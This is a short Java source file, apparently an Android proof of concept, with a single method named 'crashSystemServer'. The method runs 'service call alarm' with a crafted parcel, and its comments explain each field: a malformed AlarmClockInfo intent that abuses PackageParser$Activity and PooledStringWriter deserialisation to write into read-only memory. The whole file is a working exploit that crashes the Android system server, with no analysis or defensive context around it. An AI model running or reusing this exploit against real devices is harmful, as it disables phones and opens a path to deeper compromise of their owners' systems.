package com.example.csapp;
import java.io.IOException;

public class Main {

    static void crashSystemServer() throws IOException {
        new ProcessBuilder(
                // IAlarmManager.set
                "service", "call", "alarm", "1",
                // String callingPackage
                "i32", "-1",
                // int type
                "i32", "0",
                // long triggerAtTime
                "i64", "0",
                // long windowLength
                "i64", "0",
                // long interval
                "i64", "0",
                // int flags
                "i32", "0",
                // PendingIntent operation == null
                "i32", "0",
                // IAlarmListener listener
                "null",
                // String listenerTag
                "i32", "-1",
                // WorkSource workSource == null
                "i32", "0",
                // AlarmManager.AlarmClockInfo alarmClock != null
                "i32", "1",
                // long mTriggerTime
                "i64", "0",
                // mShowIntent = readParcelable
                "s16", "android.content.pm.PackageParser$Activity",
                // String PackageParser.Component.className = null
                "i32", "-1",
                // String PackageParser.Component.metaData = null
                "i32", "-1",
                // createIntentsList() N=1
                "i32", "1",
                // Class.forName()
                "s16", "android.os.PooledStringWriter",
                // Padding so write goes in-place into read-only preallocated memory
                "i32", "0"
        ).start();
    }

}
